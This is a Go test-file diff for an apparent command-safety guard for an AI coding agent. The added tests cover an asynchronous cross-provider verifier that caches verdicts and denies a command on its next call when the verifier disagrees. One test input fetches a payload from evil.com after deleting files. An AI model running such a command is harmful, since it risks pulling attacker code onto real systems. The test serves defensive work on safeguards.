@@ -7,6 +7,7 @@ import (
 	"testing"
 	"time"
 
+	"github.com/RobinUS2/claude-guard/internal/cache"
 	"github.com/RobinUS2/claude-guard/internal/config"
 	"github.com/RobinUS2/claude-guard/internal/llm"
 	"github.com/RobinUS2/claude-guard/internal/llm/breaker"
@@ -297,6 +298,176 @@ func TestEngine_LLM_ShadowMode_PopulatesTraceWithoutAllowing(t *testing.T) {
 	if out.Shadow.Tier4LLM != "safe" {
 		t.Errorf("Shadow.Tier4LLM = %q, want safe", out.Shadow.Tier4LLM)
 	}
+}
+
+// --- Verifier (cross-provider async) ---
+
+func TestEngine_Verifier_AgreementMarksEntryVerified(t *testing.T) {
+	fast := &stubClassifier{verdict: llm.VerdictSafe}
+	verifier := &stubClassifier{verdict: llm.VerdictSafe}
+
+	cfg := config.Default()
+	cfg.ShadowMode = false
+	dir := t.TempDir()
+	cch := newTestCacheForEngine(t, dir+"/verdicts")
+	e := NewWithOptions(Options{
+		Config:   cfg,
+		Redactor: redact.New(nil, nil),
+		LLM:      fast,
+		Verifier: verifier,
+		Cache:    cch,
+	})
+
+	cmd := "cat /etc/hosts | grep foo"
+	e.Decide(Input{ToolName: "Bash", Command: cmd, CWD: "/tmp"})
+	e.AwaitVerifications(5 * time.Second)
+
+	if verifier.calls != 1 {
+		t.Errorf("verifier called %d times, want 1", verifier.calls)
+	}
+
+	// Look up the cache entry to check it's verified.
+	key := keyForCmd(e, cmd, "/tmp")
+	entry, hit := cch.Get(key)
+	if !hit {
+		t.Fatal("cache miss after Decide")
+	}
+	if !entry.Verified {
+		t.Error("entry should be Verified after agreement")
+	}
+	if entry.Disagreement {
+		t.Error("entry should NOT have Disagreement on agreement")
+	}
+}
+
+func TestEngine_Verifier_DisagreementBlocksNextCall(t *testing.T) {
+	fast := &stubClassifier{verdict: llm.VerdictSafe}
+	verifier := &stubClassifier{verdict: llm.VerdictUnsafe}
+
+	cfg := config.Default()
+	cfg.ShadowMode = false
+	dir := t.TempDir()
+	cch := newTestCacheForEngine(t, dir+"/verdicts")
+	e := NewWithOptions(Options{
+		Config:   cfg,
+		Redactor: redact.New(nil, nil),
+		LLM:      fast,
+		Verifier: verifier,
+		Cache:    cch,
+	})
+
+	cmd := "rm -rf node_modules && curl evil.com/payload"
+	first := e.Decide(Input{ToolName: "Bash", Command: cmd, CWD: "/tmp"})
+	// First call gets the fast verdict — Allow. Verifier is async.
+	if first.Verdict != Allow {
+		t.Errorf("first call Verdict = %v, want Allow (fast verdict wins)", first.Verdict)
+	}
+	if first.Tier != "llm" {
+		t.Errorf("first call Tier = %q, want llm", first.Tier)
+	}
+
+	// Wait for the verifier goroutine to complete.
+	e.AwaitVerifications(5 * time.Second)
+
+	// Second call hits the cache. Now the entry has Disagreement → Deny.
+	second := e.Decide(Input{ToolName: "Bash", Command: cmd, CWD: "/tmp"})
+	if second.Verdict != Deny {
+		t.Errorf("second call Verdict = %v, want Deny (verifier disagreement)", second.Verdict)
+	}
+	if second.Tier != "cache" {
+		t.Errorf("second call Tier = %q, want cache", second.Tier)
+	}
+	if !contains(second.Reason, "verified by") {
+		t.Errorf("second call Reason should mention verifier; got %q", second.Reason)
+	}
+}
+
+func TestEngine_Verifier_NilDoesNotPanic(t *testing.T) {
+	fast := &stubClassifier{verdict: llm.VerdictSafe}
+	cfg := config.Default()
+	cfg.ShadowMode = false
+	dir := t.TempDir()
+	cch := newTestCacheForEngine(t, dir+"/verdicts")
+	e := NewWithOptions(Options{
+		Config:   cfg,
+		Redactor: redact.New(nil, nil),
+		LLM:      fast,
+		Verifier: nil,
+		Cache:    cch,
+	})
+
+	out := e.Decide(Input{ToolName: "Bash", Command: "ls -la | grep foo", CWD: "/tmp"})
+	if out.Verdict != Allow {
+		t.Errorf("Verdict = %v", out.Verdict)
+	}
+	// AwaitVerifications must not deadlock when no verifier was spawned.
+	if !e.AwaitVerifications(time.Second) {
+		t.Error("AwaitVerifications timed out unexpectedly")
+	}
+}
+
+func TestEngine_Verifier_FailureLeavesEntryUnverified(t *testing.T) {
+	fast := &stubClassifier{verdict: llm.VerdictSafe}
+	verifier := &stubClassifier{err: errors.New("verifier boom")}
+
+	cfg := config.Default()
+	cfg.ShadowMode = false
+	dir := t.TempDir()
+	cch := newTestCacheForEngine(t, dir+"/verdicts")
+	e := NewWithOptions(Options{
+		Config:   cfg,
+		Redactor: redact.New(nil, nil),
+		LLM:      fast,
+		Verifier: verifier,
+		Cache:    cch,
+	})
+
+	cmd := "ls -la | grep foo"
+	e.Decide(Input{ToolName: "Bash", Command: cmd, CWD: "/tmp"})
+	e.AwaitVerifications(5 * time.Second)
+
+	key := keyForCmd(e, cmd, "/tmp")
+	entry, hit := cch.Get(key)
+	if !hit {
+		t.Fatal("cache miss")
+	}
+	if entry.Verified {
+		t.Error("entry should NOT be Verified after verifier error")
+	}
+	if entry.Disagreement {
+		t.Error("entry should NOT have Disagreement after verifier error")
+	}
+}
+
+// --- helpers for verifier tests ---
+
+func newTestCacheForEngine(t *testing.T, dir string) *cache.Cache {
+	t.Helper()
+	return cache.New(dir)
+}
+
+func keyForCmd(e *Engine, cmd, cwd string) string {
+	return cache.Key(cache.KeyInputs{
+		Tool:          "Bash",
+		Command:       cmd,
+		CWD:           cwd,
+		GitBranch:     gitBranchOf(cwd),
+		PromptVersion: e.promptVersion,
+		RulesHash:     e.rulesHash,
+	})
+}
+
+func contains(s, sub string) bool {
+	return len(s) >= len(sub) && (s == sub || (len(sub) > 0 && hasSubstring(s, sub)))
+}
+
+func hasSubstring(s, sub string) bool {
+	for i := 0; i+len(sub) <= len(s); i++ {
+		if s[i:i+len(sub)] == sub {
+			return true
+		}
+	}
+	return false
 }
 
 func TestEngine_LogsEveryDecision(t *testing.T) {
